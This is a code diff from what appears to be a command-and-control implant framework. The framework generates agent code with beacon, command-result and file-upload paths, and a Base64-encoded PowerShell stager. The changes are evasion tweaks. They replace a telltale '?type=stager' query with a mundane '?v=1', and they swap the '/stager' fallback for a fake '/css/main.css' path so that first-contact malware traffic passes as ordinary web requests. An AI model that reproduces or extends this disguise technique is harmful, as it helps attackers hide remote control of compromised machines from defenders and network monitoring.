@@ -56,10 +56,11 @@ def generate_agent_code(server_address, beacon_path=None, cmd_result_path=None, 
     # Generate the agent using the templates
     agent_code = generate_from_templates(
         server_address=server_address,
-        beacon_path=None,  # No dedicated paths in pool-only mode
-        cmd_result_path=None,  # No dedicated paths in pool-only mode
-        file_upload_path=None,  # No dedicated paths in pool-only mode
-        file_request_path=None,  # No dedicated paths in pool-only mode
+        # No need for dedicated paths anymore
+        beacon_path=None,
+        cmd_result_path=None,
+        file_upload_path=None,
+        file_request_path=None,
         rotation_enabled=True,  # Always enabled in pool-only mode
         rotation_id=rotation_id,
         next_rotation_time=next_rotation,
@@ -194,14 +195,14 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         path_pool_code=path_pool_code
     )
     
-    # Get a random path for the stager and add type=stager parameter for easier identification
+    # Get a random path for the stager and add a mundane query parameter (v=1) to identify stager requests
     random_path = None
     if 'path_pool' in locals() and isinstance(path_pool, list) and path_pool:
         import random
-        random_path = random.choice(path_pool) + "?type=stager"  # Add stager identifier
+        random_path = random.choice(path_pool) + "?v=1"  # Use mundane parameter name
     else:
         # Fallback if no path pool is available
-        random_path = "/stager?type=stager"
+        random_path = "/css/main.css?v=1"  # Use more common-looking path and parameter
         
     # Create the Base64 stager with improved security for first contact
     stager_path = random_path
